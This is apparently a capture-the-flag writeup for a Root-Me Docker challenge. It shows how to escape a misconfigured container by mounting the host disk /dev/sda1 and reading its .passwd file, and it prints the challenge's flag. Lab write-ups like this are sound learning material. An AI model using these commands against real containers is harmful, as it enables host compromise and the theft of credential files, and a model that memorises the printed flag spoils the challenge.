---
title: RootMe Docker - I am Groot Writeup
date: 2023-10-05
categories: [RootMe, AppScript]
tags: [RootMe, RootMe - AppScript, WriteUp]
author: barabulkit
---

# RootMe Docket - I am Groot

In this challenge we need to read /.passwd file to complete it
This challenge is misconfigured docker container, so we can mount real host drive and cat .passwd file

```
mkdir -p /mnt/mount_point
mount /dev/sda1 /mnt/mount_point
cat /mnt/mount_point/.passwd
```

We will get flag `b95d3d00d5336d16d7f27454ebe9cc58`